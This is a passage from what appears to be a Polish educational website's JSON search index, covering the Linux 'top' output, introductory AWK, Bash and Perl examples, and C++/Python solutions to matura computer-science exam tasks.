dzia\u0142a</li> <li>ilu u\u017cytkownik\u00f3w jest zalogowanych</li> <li>\u015brednie obci\u0105\u017cenie</li> </ul>"},{"location":"linux/processes/#linia-2","title":"Linia 2","text":"<ul> <li>ca\u0142kowita liczba zada\u0144</li> <li>liczba dzia\u0142aj\u0105cych zada\u0144</li> <li>liczba u\u015bpionych zada\u0144</li> <li>liczba zatrzymanych zada\u0144</li> <li>liczba zada\u0144 zombie</li> </ul>"},{"location":"linux/processes/#linia-3","title":"Linia 3","text":"<p>Procentowe zu\u017cycie procesora dla:</p> <ul> <li>u\u017cytkownik\u00f3w</li> <li>systemu</li> <li>proces\u00f3w o niskim priorytecie (low priority processes)</li> <li>bezczynnych proces\u00f3w (idle processes)</li> <li>czekaj\u0105cych na wej\u015bcie/wyj\u015bcie (io wait)</li> <li>przerwa\u0144 sprz\u0119towych (hardware interrupts)</li> <li>przerwa\u0144 systemowych (software interrupts)</li> <li>steal time</li> </ul>"},{"location":"linux/processes/#linia-4","title":"Linia 4","text":"<p>Zu\u017cycie pami\u0119ci w kilobajtach:</p> <ul> <li>pe\u0142na pami\u0119\u0107 (total memory)</li> <li>wykorzystana pami\u0119\u0107 (used memory)</li> <li>wolna pami\u0119\u0107 (free memory)</li> <li>zbuforowana pami\u0119\u0107 (buffered memory)</li> </ul>"},{"location":"linux/processes/#linia-5","title":"Linia 5","text":"<p>Zu\u017cycie pami\u0119ci wymiany (swap) w kilobajtach:</p> <ul> <li>pe\u0142na pami\u0119\u0107 (total memory)</li> <li>wykorzystana pami\u0119\u0107 (used memory)</li> <li>wolna pami\u0119\u0107 (free memory)</li> <li>cached memory</li> </ul>"},{"location":"linux/processes/#nagowki-tabeli","title":"Nag\u0142\u00f3wki tabeli","text":"<ul> <li>ID procesu</li> <li>u\u017cytkownik</li> <li>priorytet</li> <li>nice user</li> <li>pami\u0119\u0107 wirtualna</li> <li>resident memory</li> <li>pami\u0119\u0107 wsp\u00f3\u0142dzielona</li> <li>proces u\u017cywanego CPU</li> <li>procent u\u017cywanej pami\u0119ci</li> <li>czas dzia\u0142ania procesu</li> <li>polecenie</li> </ul>"},{"location":"linux/awk/","title":"AWK","text":"<p>AWK jest interpretowanym j\u0119zykiem programowania, kt\u00f3ry s\u0142u\u017cy przede wszystkim do przetwarzania plik\u00f3w tekstowych. Korzystaj\u0105c z tego j\u0119zyka mo\u017cemy w \u0142atwy spos\u00f3b prztworzy\u0107 pliki wiersz po wierszu, np. pozostawiaj\u0105c tylko wybrane kolumny, lub wyrazy.</p>"},{"location":"linux/awk/#sciaga","title":"\u015aci\u0105ga","text":"<p>\u015aci\u0105ga</p>"},{"location":"linux/awk/blocks/","title":"Bloki","text":""},{"location":"linux/awk/blocks/#przykad-1","title":"Przyk\u0142ad 1","text":"<pre><code>#!/usr/bin/awk -f\n\n# Blok operacji poczatkowych\nBEGIN {\n   print \"*****Poczatek Pliku******\"\n}\n\n# Blok operacji biezacych (wykonywanych na kazdej linii tekstu)\n{\n   print $0 \n}\n\n# Blok operacji koncowych\nEND {\n   print \"*****Koniec Pliku*****\"\n}\n</code></pre>"},{"location":"linux/awk/blocks/#przykad-2","title":"Przyk\u0142ad 2","text":"<pre><code>#!/usr/bin/awk -f\n\n# Blok operacji poczatkowych\nBEGIN {\n   OFS=\"\\t\"\n   print \"username IP\"\n}\n\n# Blok operacji biezacych (wykonywanych na kazdej linii tekstu)\n{\n   print $1,$5 \n}\n\n# Blok operacji koncowych\nEND {\n   print \"*****Koniec Pliku*****\"\n}\n</code></pre>"},{"location":"linux/awk/blocks/#przykad-3","title":"Przyk\u0142ad 3","text":"<pre><code>#!/usr/bin/awk -f\n\n# Skrypt zliczajacy liczbe osob zalogowanych na serwerze / liczbe linii w pliku wejsciowym\n\n# Blok operacji poczatkowych\nBEGIN {\n   print \"username IP\"\n   # Tworzymy nowa zmienna: licznik wszystkich linii\n   licznik=0\n}\n\n# Blok operacji biezacych (wykonywanych na kazdej linii tekstu)\n{\n   print $1,$5\n\n   # Zwiekszamy licznik o 1 dla kazdej przetworzonej linii\n   licznik++\n}\n\n# Blok operacji koncowych\nEND {\n   print \"\\n\\nLiczba osob zalogowanych: \" licznik\n}\n</code></pre>"},{"location":"linux/awk/blocks/#przykad-4","title":"Przyk\u0142ad 4","text":"<pre><code>#!/usr/bin/awk -f\n\n# Skrypt zliczajacy liczbe osob zalogowanych na serwerze / liczbe linii w pliku wejsciowym\n# Skrypt numeruje kazda linie\n\n# Blok operacji poczatkowych\nBEGIN {\n   print \"username IP\"\n   # Tworzymy nowa zmienna: licznik wszystkich linii\n   licznik=0\n}\n\n# Blok operacji biezacych (wykonywanych na kazdej linii tekstu)\n{\n   # Zwiekszamy licznik o 1 dla kazdej przetworzonej linii\n   licznik++\n\n   print licznik \": \" $1,$5\n}\n\n# Blok operacji koncowych\nEND {\n   print \"\\n\\nLiczba osob zalogowanych: \" licznik\n}\n</code></pre>"},{"location":"linux/awk/conditionals/","title":"Instrukcje warunkowe","text":""},{"location":"linux/awk/conditionals/#przykad-1","title":"Przyk\u0142ad 1","text":"<pre><code>#!/usr/bin/awk -f\n\n{\n   if($2==$3) {\n\n   } else {\n      print $0\n   }    \n}\n</code></pre>"},{"location":"linux/awk/loops/","title":"P\u0119tle","text":""},{"location":"linux/awk/loops/#petla-iteracyjna","title":"P\u0119tla iteracyjna","text":""},{"location":"linux/awk/loops/#przykad","title":"Przyk\u0142ad","text":"<pre><code>#!/usr/bin/awk -f\n\nBEGIN {\n    for(i=1; i &lt;= 10; i++) { \n        print i*i\n    }\n}\n</code></pre>"},{"location":"linux/awk/loops/#petla-warunkowa","title":"P\u0119tla warunkowa","text":""},{"location":"linux/awk/loops/#przykad_1","title":"Przyk\u0142ad","text":"<pre><code>#!/usr/bin/awk -f\n\nBEGIN {\n   i = 1\n   while(i &lt;= 10) {\n      print i*i \n      i++\n   }\n\n}\n</code></pre>"},{"location":"linux/awk/words/","title":"Wyrazy","text":""},{"location":"linux/awk/words/#przykad-1","title":"Przyk\u0142ad 1","text":"<pre><code>#!/usr/bin/awk -f\n\n# Polecenia piszemy w nawiasach klamrowych\n{\n   # Wypisujemy pierwszy wyraz z kazdej linii\n   print $1 \n}\n</code></pre>"},{"location":"linux/awk/words/#przykad-2","title":"Przyk\u0142ad 2","text":"<pre><code>#!/usr/bin/awk -f\n\n# Polecenia piszemy w nawiasach klamrowych\n{\n   # Wypisujemy kazda linie w okreslonym formacie\n   print \"username: \" $1 \"; IP: \" $5 \n}\n</code></pre>"},{"location":"linux/awk/words/#przykad-3","title":"Przyk\u0142ad 3","text":"<pre><code>#!/usr/bin/awk -f\n\n# Polecenia piszemy w nawiasach klamrowych\n{\n   # Wypisujemy ostatni wyraz z kazdej linii\n   print $NF \n}\n</code></pre>"},{"location":"linux/awk/words/#przykad-4","title":"Przyk\u0142ad 4","text":"<pre><code>#!/usr/bin/awk -f\n\n# Dla przykladu stosujemy skrypt na wyniku polecenia date\n\n# Na poczatku mozemy dac opcje konfiguracyjne\n\n# OFS - Output Field Separator, czyli znak, ktorym oddzielamy dane na wyjsciu\nOFS=\":\"\n\n# Polecenia piszemy w nawiasach klamrowych\n{\n   print $2,$3,$4\n}\n</code></pre>"},{"location":"linux/awk/words/#przykad-5","title":"Przyk\u0142ad 5","text":"<pre><code>#!/usr/bin/awk -f\n\n# Uruchamiamy na pliki /etc/passwd\n\n# FS - Field Separator, czyli znak oddzielajacy pola na wejsciu\nFS=\":\"\n\n# Polecenia piszemy w nawiasach klamrowych\n{\n   # Wypisujemy pierwszy wyraz z kazdej linii\n   print $1 \n}\n</code></pre>"},{"location":"linux/bash/","title":"Bash","text":"<p>Bash to pow\u0142oka systemowa, jedna z najpopularniejszych w systemach uniksowych. W wi\u0119kszo\u015bci dystrybucji jest domy\u015bln\u0105 pow\u0142ok\u0105, dlatego warto wiedzie\u0107, jak z niej poprawnie korzysta\u0107 i jak wykorzysta\u0107 jej mo\u017cliwo\u015bci, w szczeg\u00f3lno\u015bci pod wzgl\u0119dem skrypt\u00f3w.</p>"},{"location":"linux/bash/#tworzenie-skryptow","title":"Tworzenie skrypt\u00f3w","text":"<p>Utw\u00f3rzmy plik skrypt.sh o zawarto\u015bci takiej jak pokazano poni\u017cej.</p> <pre><code>#!/bin/bash\n\necho \"Hello World!\"\n</code></pre> <p>Teraz nale\u017cy nada\u0107 plikowi prawa do wykonywania, by m\u00f3c go uruchomi\u0107:</p> <pre><code>chmod u+x skrypt.sh\n</code></pre> <p>W ko\u0144cu uruchamiamy nasz skrypt:</p> <pre><code>./skrypt.sh\n</code></pre> <p>W konsoli powinien wy\u015bwietli\u0107 si\u0119 nam komunikat Hello World!.</p>"},{"location":"linux/bash/#sciaga","title":"\u015aci\u0105ga","text":"<p>\u015aci\u0105ga</p>"},{"location":"linux/bash/commands/","title":"Polecenia","text":"<p>W skryptach bash mo\u017cemy wywo\u0142ywa\u0107 polecenia pow\u0142oki bash. W tym celu wystarczy wpisa\u0107 do skryptu zadane polecenie. Mo\u017cemy tak\u017ce przechwyci\u0107 wynik polecenia i zapisa\u0107 go w zmiennej. W\u00f3wczas polecenie nale\u017cy zapisa\u0107 w apostrofach (znak pod tyld\u0105).</p>"},{"location":"linux/bash/commands/#przykad-1","title":"Przyk\u0142ad 1","text":"<pre><code>#!/bin/bash\n\ndzisiaj=`date`\n\necho $dzisiaj\n\nmiesiac=`date +%m`\necho \"Miesiac: $miesiac\"\n\nrok=`date +%Y`\necho \"Rok: $rok\"\n\ndata=`date +%d-%m-%Y`\necho \"Data: $data\"\n\ndata2=`date '+%d %m %Y'`\necho \"Data2: $data2\"\n</code></pre>"},{"location":"linux/bash/commands/#przykad-2","title":"Przyk\u0142ad 2","text":"<pre><code>#!/bin/bash\n\n# Definiujemy polecenie, zapamietujemy w zmiennej\npolecenie=\"ls -la\"\n\n# Wypisujemy tekst polecenia\necho $polecenie\necho\n\n# Uruchamiamy polecenie, jego wynik zobaczymy w terminalu\n$polecenie\n\nwynik=`ls -la`\n\necho\necho \"Wynik polecenia:\"\necho $wynik\n</code></pre>"},{"location":"linux/bash/conditionals/","title":"Instrukcje warunkowe","text":""},{"location":"linux/bash/conditionals/#przykad-1","title":"Przyk\u0142ad 1","text":"<pre><code>#!/bin/bash\n\n# gt : greater than\nif [ 150 -gt 25 ]\nthen\n    echo \"Warunek wiekszosci spelniony\"\nfi\n\n# lt: less than\nif [ 25 -lt  150 ]\nthen\n    echo \"Warunek mniejszosci spelniony\"\nfi\n\n# eq: equal\nif [ 25 -eq  25 ]\nthen\n    echo \"Warunek rownosci spelniony\"\nfi\n</code></pre>"},{"location":"linux/bash/conditionals/#przykad-2","title":"Przyk\u0142ad 2","text":"<pre><code>#!/bin/bash\n\n# gt : greater than\nif [ 4 -gt 25 ]\nthen\n    echo \"Warunek wiekszosci spelniony\"\nelse\n    echo \"Warunek wiekszosci nie jest spelniony\"\nfi\n\n# lt: less than\nif [ 180 -lt  150 ]\nthen\n    echo \"Warunek mniejszosci spelniony\"\nelse\n    echo \"Warunek mniejszosci nie jest spelniony\"\nfi\n\n# eq: equal\nif [ 4 -eq  25 ]\nthen\n   echo \"Warunek rownosci spelniony\"\nelse\n   echo \"Warunek rownosci nie jest spelniony\"\nfi\n</code></pre>"},{"location":"linux/bash/conditionals/#przykad-3","title":"Przyk\u0142ad 3","text":"<pre><code>#!/bin/bash\n\nif [ $(($1 % 4)) -eq 0 ] &amp;&amp; [ ! $(($1 % 100)) -eq 0 ]\nthen\n    echo \"Rok jest przestepny\"\nelif [ $(($1 % 400)) -eq 0 ]\nthen\n    echo \"Rok jest przestepny\"\nelse\n    echo \"Rok nie jest przestepny\"\nfi\n</code></pre>"},{"location":"linux/bash/files/","title":"Pliki","text":""},{"location":"linux/bash/files/#czytanie-plikow","title":"Czytanie plik\u00f3w","text":""},{"location":"linux/bash/files/#przykad","title":"Przyk\u0142ad","text":"<pre><code>#!/bin/bash\n\nwynik=`cat wynik.txt`\necho \"$wynik\"\n</code></pre>"},{"location":"linux/bash/files/#pisanie-do-plikow","title":"Pisanie do plik\u00f3w","text":""},{"location":"linux/bash/files/#przykad_1","title":"Przyk\u0142ad","text":"<pre><code>#!/bin/bash\n\nplik=wynik.txt\n\n# Przekierowujemy wynik polecenia ls do pliku\nls -la&gt; $plik\n\ncat $plik\n</code></pre>"},{"location":"linux/bash/input-output/","title":"Obs\u0142uga wej\u015bcia-wyj\u015bcia","text":""},{"location":"linux/bash/input-output/#wyjscie","title":"Wyj\u015bcie","text":"<p>Najprostszym sposobem na wypisanie komunikatu jest skorzystanie z polecenia <code>echo</code>.</p>"},{"location":"linux/bash/input-output/#przykad-1","title":"Przyk\u0142ad 1","text":"<p>Do polecenia echo mo\u017cemy przekaza\u0107 tekst zamkni\u0119ty w podw\u00f3jny cudzys\u0142\u00f3w. Tekst ten zostanie wypisany w konsoli po uruchomieniu skryptu.</p> <pre><code>#!/bin/bash\n\necho \"Hello World!\"\n</code></pre>"},{"location":"linux/bash/input-output/#przykad-2","title":"Przyk\u0142ad 2","text":"<p>Komunikat do wypisania mo\u017cemy tak\u017ce zapisa\u0107 w zmiennej, kt\u00f3r\u0105 nast\u0119pnie przekazujemy do polecenia echo. W tym celu przed nazw\u0105 zmiennej wstawiamy znak dolara.</p> <pre><code>#!/bin/bash\n\n# Tworzymy zmienna\npowitanie=\"Hello World!\"\n\n# Wypisujemy wartosc zmiennej\necho $powitanie\n</code></pre>"},{"location":"linux/bash/input-output/#przykad-3","title":"Przyk\u0142ad 3","text":"<p>Warto\u015bci zmiennych mo\u017cemy tak\u017ce podstawia\u0107 wewn\u0105trz komunikat\u00f3w, jednak tylko wtedy, gdy komunikat opatrzymy podw\u00f3jnym cudzys\u0142owiem. Gdy tekst zamkni\u0119ty jest w pojedy\u0144czy cudzys\u0142\u00f3w, to znaki specjalne, takie jak dolar, nie s\u0105 interpretowane.</p> <p>Mo\u017cemy tak\u017ce zignorowa\u0107 znaczenie specjalnego znaku w standardowym tek\u015bcie poprzez skorzystanie ze znaku <code>\\</code>.</p> <pre><code>#!/bin/bash\n\npowitanie=\"Hello World!\"\n\n# Tekst z interpretowaniem symboli\necho \"Komunikat: $powitanie\"\n\n# Czysty tekst\necho 'Komunikat: $powitanie'\n\n# Ignorowanie specjalnego znaczenia znaku\necho \"Komunikat: \\$powitanie\"\n</code></pre>"},{"location":"linux/bash/input-output/#wejscie","title":"Wej\u015bcie","text":"<p>Jednym ze sposob\u00f3w na wczytanie wej\u015bcia od u\u017cytkownika z poziomu konsoli jest u\u017cycie polecenia <code>read</code>. Mo\u017cemy tak\u017ce korzysta\u0107 z warto\u015bci przekazanych podczas uruchamiania skryptu.</p>"},{"location":"linux/bash/input-output/#przykad-1_1","title":"Przyk\u0142ad 1","text":"<p>Polecenie read pozwala nam w spos\u00f3b interaktywny wczyta\u0107 wej\u015bcie od u\u017cytkownika i zapisa\u0107 je w podanej zmiennej.</p> <pre><code>#!/bin/bash\n\necho \"Wpisz swoj nick:\"\n\n# Wartosci z wejscia wczytujemy poleceniem read\nread username\n\necho \"Podano: $username\"\necho\necho \"Podaj 3 liczby:\"\n\nread num1 num2 num3\necho \"Podano: $num1, $num2, $num3\"\n\n# Korzystamy z read w formie prompt\nread -p \"Tekst: \" tekst\necho $tekst\n</code></pre>"},{"location":"linux/bash/input-output/#przykad-2_1","title":"Przyk\u0142ad 2","text":"<p>Parametry przekazane podczas uruchamiania skryptu mo\u017cemy odczyta\u0107 korzystaj\u0105c ze znaku dolar, po kt\u00f3rym podajemy liczb\u0119 oznaczaj\u0105c\u0105 numer parametru.</p> <pre><code>#!/bin/bash\n\necho \"Polecenie: $0\"\necho \"Pierwszy parametr: $1\"\necho \"Drugi parametr: $2\"\necho \"Wszystkie parametry: $@\"\necho \"Liczba parametrow: $#\"\n</code></pre>"},{"location":"linux/bash/math/","title":"Obliczenia","text":"<p>W celu wykonania oblicze\u0144 arytmetycznych zamykamy je w podw\u00f3jne nawiasy okr\u0105g\u0142e opatrzone z przodu znakiem dolara: <code>$(( ))</code>.</p>"},{"location":"linux/bash/math/#przykad","title":"Przyk\u0142ad","text":"<pre><code>#!/bin/bash\n\nsuma=$((3+8))\necho $suma\n\na=1\nb=7\n\niloczyn=$((a*b))\necho $iloczyn\n\nmodulo=$((10%3))\necho $modulo\n</code></pre>"},{"location":"linux/perl/","title":"Perl","text":"<p>Perl to interpretowany, dynamiczny j\u0119zyk programowania. Pocz\u0105tkowo Perl by\u0142 wykorzystywany g\u0142\u00f3wnie do pracy z danymi tekstowymi, obecnie jednak znajduje tak\u017ce wiele innych zastosowa\u0144.</p>"},{"location":"linux/perl/arrays/","title":"Tablice","text":"<p>W j\u0119zyku Perl zmienne tablicowe podczas ich definiowania poprzedzamy znakiem @, zamiast znaku dolara jak przy standardowych zmiennych. Zawarto\u015b\u0107 tablicy definiujemy za pomoc\u0105 nawias\u00f3w okr\u0105g\u0142ych. Elementy tablicy indeksowane s\u0105 od zera, a do poszczeg\u00f3lnych element\u00f3w odwo\u0142ujemy si\u0119 korzystaj\u0105c z klasycznej notacji nawias\u00f3w kwadratowych.</p>"},{"location":"linux/perl/arrays/#przykad","title":"Przyk\u0142ad","text":"<pre><code>#!/usr/bin/perl\n\n@liczby = (1, 2, 3);\n\nprint \"$liczby[0]\\n\";\nprint \"$liczby[1]\\n\";\nprint \"$liczby[2]\\n\";\n\n$rozmiar = @liczby;\n\nprint \"Rozmiar tablicy: $rozmiar\\n\";\n</code></pre>"},{"location":"linux/perl/conditionals/","title":"Instrukcja warunkowa","text":""},{"location":"linux/perl/conditionals/#przykad","title":"Przyk\u0142ad","text":"<pre><code>#!/usr/bin/perl\n\n$temp = 15;\n\nif ($temp &lt; 5) {\n    print \"Zimno!\";\n} elsif ($temp &lt; 20) {\n    print \"Umiarkowanie!\";\n} else {\n    print \"Cieplo!\";\n}\n</code></pre>"},{"location":"linux/perl/files/","title":"Pliki","text":""},{"location":"linux/perl/files/#czytanie-plikow","title":"Czytanie plik\u00f3w","text":""},{"location":"linux/perl/files/#przykad","title":"Przyk\u0142ad","text":"<pre><code>#!/usr/bin/perl\n\n# Skrypt otwiera plik tekstowy\n# i wyswietla jego zawartosc na ekranie\n\n# Podajemy scieke do pliku\n$plik = \"katalog.perl\";\n\n# Otwieramy plik do odczytu\n\nopen(WEJ, \"&lt;\", $plik) or die \"Nie mozna otworzyc pliku!\";\n\n# Czytamy plik linia po linii az do EOF (End Of File - koniec pliku)\nwhile(&lt;WEJ&gt;) {\n    # Wypisujemy przeczytana linie na ekranie\n    print $_;\n}\n\n# Zamykamy plik\nclose(WEJ);\n\nprint \"Koniec operacji na pliku\\n\";\n</code></pre>"},{"location":"linux/perl/files/#pisanie-do-plikow","title":"Pisanie do plik\u00f3w","text":""},{"location":"linux/perl/files/#przykad_1","title":"Przyk\u0142ad","text":"<pre><code>#!/usr/bin/perl\n\n# Skrypt zapisuje kilka liniii tekstu do pliku\n\n# Podajemy sciezke do pliku\n$plik = \"wynik.txt\";\n\n# Otwieramy plik do zapisu\nopen(WYJ, \"&gt;\", $plik) or die \"Nie mozna otworzyc pliku!\";\n\n# Zapisujemy komunikaty do pliku\nprint WYJ \"Ala ma kota\\n\";\nprint WYJ \"a kot\\n\";\nprint WYJ \"ma Ale\\n\";\n\n# Zamykamy plik\nclose(WYJ);\n\nprint \"Koniec operacji na pliku\\n\";\n</code></pre>"},{"location":"linux/perl/files/#katalogi","title":"Katalogi","text":""},{"location":"linux/perl/files/#przykad_2","title":"Przyk\u0142ad","text":"<pre><code>#!/usr/bin/perl\n\n# Skrypt wypisuje zawartosc katalogu domowego\n\n# Zapisujemy sciezke do katalogu\n# A takze wyrazenie, ktore okresla, jakie pliki nas interesuja\n# * - chcemy wypisac wszystko\n$dir = \"~/*\";\n\n@pliki = glob($dir);\n\nforeach $el (@pliki) {\n    print \"$el\\n\";\n}\n</code></pre>"},{"location":"linux/perl/fork/","title":"Fork","text":""},{"location":"linux/perl/fork/#przykad","title":"Przyk\u0142ad","text":"<pre><code>#!/usr/bin/perl\n\nif (!defined($pid = fork())) {\n    die \"Nie mozna utworzyc procesu potomnego!\";\n} elsif ($pid == 0) {\n    print \"Proces potomny\\n\";\n} else {\n    print \"Proces rodzica\\n\";\n    # Czekamy na proces potomny\n    $ret = waitpid($pid, 0);\n    print \"Zakonczono obliczenia, id procesu potomnego: $ret\\n\";\n}\n</code></pre>"},{"location":"linux/perl/input-output/","title":"Obs\u0142uga wej\u015bcia/wyj\u015bcia","text":""},{"location":"linux/perl/input-output/#obsuga-wyjscia","title":"Obs\u0142uga wyj\u015bcia","text":""},{"location":"linux/perl/input-output/#przykad-1","title":"Przyk\u0142ad 1","text":"<pre><code>#!/usr/bin/perl\n\nprint \"Hello World!\\n\";\n</code></pre>"},{"location":"linux/perl/input-output/#przykad-2","title":"Przyk\u0142ad 2","text":"<pre><code>#!/usr/bin/perl\n\n# Tworzymy zmienna\n$hello = \"Hello World!\";\n\n# Wypisujemy wartosc zmiennej i znak nowej linii\nprint \"$hello\\n\";\n\n# \\U - Upper - zmienia wszystkie litery z linii na drukowane\n$hello = \"\\UHello World!\";\n\nprint \"$hello\\n\";\n\n# \\E - End - konczy dzialanie \\U\n$hello = \"\\UHello\\E World!\";\n\nprint \"$hello\\n\";\n</code></pre>"},{"location":"linux/perl/loops/","title":"P\u0119tle","text":""},{"location":"linux/perl/loops/#petla-iteracyjna-for","title":"P\u0119tla iteracyjna for","text":"<p>W j\u0119zyku Perl mamy do dyspozycji standardow\u0105 p\u0119tl\u0119 <code>for</code>, kt\u00f3rej sk\u0142adnia podobna jest do tej z j\u0119zyka C. Zaczynamy wi\u0119c od inicjalizacji licznika p\u0119tli, nast\u0119pnie definiujemy warunek p\u0119tli, a na ko\u0144cu okre\u015blamy krok p\u0119tli.</p>"},{"location":"linux/perl/loops/#przykad","title":"Przyk\u0142ad","text":"<pre><code>#!/usr/bin/perl\n\n@liczby = (1, 2, 3);\n\n$rozmiar = @liczby;\n\nfor($i = 0; $i &lt; $rozmiar; $i = $i + 1) {\n    $el = @liczby[$i];\n    print \"$el\\n\";\n}\n</code></pre>"},{"location":"linux/perl/loops/#petla-iteracyjna-foreach","title":"P\u0119tla iteracyjna foreach","text":""},{"location":"linux/perl/loops/#przykad_1","title":"Przyk\u0142ad","text":"<pre><code>#!/usr/bin/perl\n\n@liczby = (1, 2, 3);\n\n# Petla przechodzi przez kazdy element tablicy\n# Zmienna el przyjmuje wartosci kolejnych elementow\nforeach $el (@liczby) {\n    print \"$el\\n\";\n}   \n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/pytania-zamkniete/","title":"Pytania zamkni\u0119te","text":"<p>Zbi\u00f3r wszystkich pyta\u0144 zamkni\u0119tych, jakie pojawi\u0142y si\u0119 na maturze z informatyki w latach 2015-2020.</p> <p> Pytania</p> <p> Odpowiedzi</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2010/","title":"2010","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2010/#arkusze","title":"Arkusze","text":"<p> Cz\u0119\u015b\u0107 I</p> <p> Cz\u0119\u015b\u0107 II</p> <p> Dane</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2010/#odpowiedzi","title":"Odpowiedzi","text":"<p> Klucz</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2010/solutions/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2010/solutions/#czesc-ii","title":"Cz\u0119\u015b\u0107 II","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2010/solutions/#zadanie-4","title":"Zadanie 4","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2010/solutions/#a","title":"a)","text":"C++Python <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n\nusing namespace std;\n\nint main()\n{\n    ifstream file(\"anagram.txt\");\n    for(int row = 0; row &lt; 200; row++) {\n        string words[5];\n        for(int word_num = 0; word_num &lt; 5; word_num++) {\n            file &gt;&gt; words[word_num];\n        }\n\n        int word_length = words[0].length();\n        bool same_length = true;\n        for(int word_num = 1; word_num &lt; 5; word_num++) {\n            if(words[word_num].length() != word_length) {\n                same_length = false;\n                break;\n            }\n        }\n\n        if(same_length) {\n            for(auto word : words) {\n                cout &lt;&lt; word &lt;&lt; \" \";\n            }\n\n            cout &lt;&lt; endl;\n        }\n    }\n\n    file.close();\n\n    return 0;\n}\n</code></pre> <pre><code>with open(\"anagram.txt\") as file:\n    for line in file:\n        words = line.split()\n        word_length = len(words[0])\n        same_length = True\n        for word in words:\n            if len(word) != word_length:\n                same_length = False\n                break\n\n        if same_length:\n            print(*words)\n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2010/solutions/#b","title":"b)","text":"C++Python <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nint main()\n{\n    ifstream file(\"anagram.txt\");\n    for(int row = 0; row &lt; 200; row++) {\n        string words[5], sorted_words[5];\n        for(int word_num = 0; word_num &lt; 5; word_num++) {\n            file &gt;&gt; words[word_num];\n            sorted_words[word_num] = words[word_num];\n            sort(sorted_words[word_num].begin(), sorted_words[word_num].end());\n        }\n\n        bool anagrams = true;\n        for(int word_num = 1; word_num &lt; 5; word_num++) {\n            if(sorted_words[word_num] != sorted_words[0]) {\n                anagrams = false;\n                break;\n            }\n        }\n\n        if(anagrams) {\n            for(auto word : words) {\n                cout &lt;&lt; word &lt;&lt; \" \";\n            }\n            cout &lt;&lt; endl;\n        }\n    }\n\n    file.close();\n\n    return 0;\n}\n</code></pre> <pre><code>with open(\"anagram.txt\") as file:\n    for line in file:\n        words = line.split()\n        words_sorted = [sorted(word) for word in words]\n        anagrams = True\n        for word in words_sorted:\n            if word != words_sorted[0]:\n                anagrams = False\n                break\n\n        if anagrams:\n            print(*words)\n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2010/solutions/#zadanie-6","title":"Zadanie 6","text":"<p> Access</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2011/","title":"2011","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2011/#arkusze","title":"Arkusze","text":"<p> Cz\u0119\u015b\u0107 I</p> <p> Cz\u0119\u015b\u0107 II</p> <p> Dane</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2011/#odpowiedzi","title":"Odpowiedzi","text":"<p> Klucz</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2011/solutions/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2012/","title":"2012","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2012/#arkusze","title":"Arkusze","text":"<p> Cz\u0119\u015b\u0107 I</p> <p> Cz\u0119\u015b\u0107 II</p> <p> Dane</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2012/#odpowiedzi","title":"Odpowiedzi","text":"<p> Klucz</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2012/solutions/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2013/","title":"2013","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2013/#arkusze","title":"Arkusze","text":"<p> Cz\u0119\u015b\u0107 I</p> <p> Cz\u0119\u015b\u0107 II</p> <p> Dane</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2013/#odpowiedzi","title":"Odpowiedzi","text":"<p> Klucz</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2013/solutions/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2013/solutions/#czesc-i","title":"Cz\u0119\u015b\u0107 I","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2013/solutions/#zadanie-1","title":"Zadanie 1","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2013/solutions/#c","title":"c)","text":"<pre><code>1. Zapami\u0119tujemy pierwszy bit z liczby\n2. Usuwamy pierwszy bit z liczby\n3. Je\u017celi pierwszy bit to 1, to zamieniamy znaki na przeciwne\n4. Konwertujemy na dziesi\u0119tny\n5. Je\u017celi pierwszy bit to 1, to mno\u017cymy wynik przez -1\n</code></pre> <pre><code>1. x := 0\n2. Je\u017celi bin[1] = 1, to:\n    3. Od i := 2 do d, wykonuj:\n        4. Je\u017celi bin[i] = 0:\n            5. bin[i] = 1\n        6. w przeciwnym przypadku\n            7. bin[i] = 0\n8. p := 1\n9. Od i := d do 2, wykonuj:\n    10. x := x + bin[i] * p\n    11. p := p * 2\n12. Je\u017celi bin[1] = 1:\n    13. x := x * -1\n14. Wypisz x\n</code></pre>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2014/","title":"2014","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2014/#arkusze","title":"Arkusze","text":"<p> Cz\u0119\u015b\u0107 I</p> <p> Cz\u0119\u015b\u0107 II</p> <p> Dane</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2014/#odpowiedzi","title":"Odpowiedzi","text":"<p> Klucz</p>"},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2014/solutions/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2015/","title":"2015","text":""},{"location":"matura-z-informatyki/arkusze-i-rozwiazania/2015/#arkusze","title":"Arkusze","text":"<p> Cz\u0119\u015b\u0107 I</p> <p> Cz\u0119\u015b\u0107 